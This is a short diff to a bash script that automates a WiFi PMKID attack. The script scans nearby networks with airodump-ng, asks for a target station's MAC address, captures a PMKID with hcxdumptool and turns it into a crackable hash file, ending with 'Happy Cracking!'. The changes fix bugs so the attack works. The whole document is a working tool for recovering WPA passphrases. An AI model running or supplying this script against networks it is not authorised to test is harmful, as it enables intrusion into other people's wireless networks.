@@ -17,16 +17,20 @@ airmon-ng check kill
 
 monInterfaceName=$interfaceName"mon"
 
-timeout 30s watch airodump-ng $monInterfaceName
+sh -c "(sleep 15; killall 'airodump-ng') & exec airodump-ng $monInterfaceName"
 
 read -p "Enter Station MAC address (no colons): " stationMAC
 
-echo stationMAC > filter.txt
+echo $stationMAC > filter.txt
 
-hcxdumptool -o hashedPMKID -i monInterfaceName --enable_status=1 --filtermode=2 --filterlist=filter.txt | grep -m 1 "FOUND PMKID CLIENT-LESS"
+hcxdumptool -o hashedPMKID -i $monInterfaceName --enable_status=1 --filtermode=2 --filterlist=filter.txt | grep -m 1 "FOUND PMKID CLIENT-LESS"
 
 hcxpcaptool -z finalHash hashedPMKID
 
+echo $'\n'
+
 cat finalHash
+
+echo $'\n'
 
 echo "Happy Cracking!"
